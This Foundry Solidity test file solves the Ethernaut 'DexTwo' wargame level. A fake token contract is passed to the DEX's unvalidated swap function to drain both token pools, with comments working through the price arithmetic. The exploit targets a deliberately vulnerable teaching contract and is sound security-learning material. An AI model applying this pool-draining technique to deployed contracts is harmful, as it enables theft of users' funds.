// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {DexTwo, SwappableTokenTwo} from "ethernaut/levels/DexTwo.sol";

import {Dex2Attacker} from "../src/Dex2/Dex2Attacker.sol";

contract DexTwoTest is Test {
    DexTwo public victim;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    address public dex2attacker = address(new Dex2Attacker());

    address public owner = address(0x3000);
    address public attacker = address(0x2000);

    function setUp() public {
        victim = new DexTwo();

        token1 = new SwappableTokenTwo(address(victim), "Token 1", "TKN1", 110);
        token2 = new SwappableTokenTwo(address(victim), "Token 2", "TKN2", 110);

        victim.setTokens(address(token1), address(token2));

        token1.approve(address(victim), 100);
        token2.approve(address(victim), 100);

        victim.add_liquidity(address(token1), 100);
        victim.add_liquidity(address(token2), 100);

        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
    }

    function testAttack() external {
        vm.startPrank(attacker);

        victim.approve(address(victim), 100000);

        // before
        //              token1     dex2attacker
        // dex          100        1
        // attacker     10         1
        // amout -> 100 * 1 / 1 = 100

        // after
        //              token1     dex2attacker
        // dex          0          1
        // attacker     110        1
        victim.swap(dex2attacker, address(token1), 1);

        // token2 hacking is the same
        victim.swap(dex2attacker, address(token2), 1);

        assertEq(token1.balanceOf(address(victim)), 0);
        assertEq(token2.balanceOf(address(victim)), 0);
    }
}
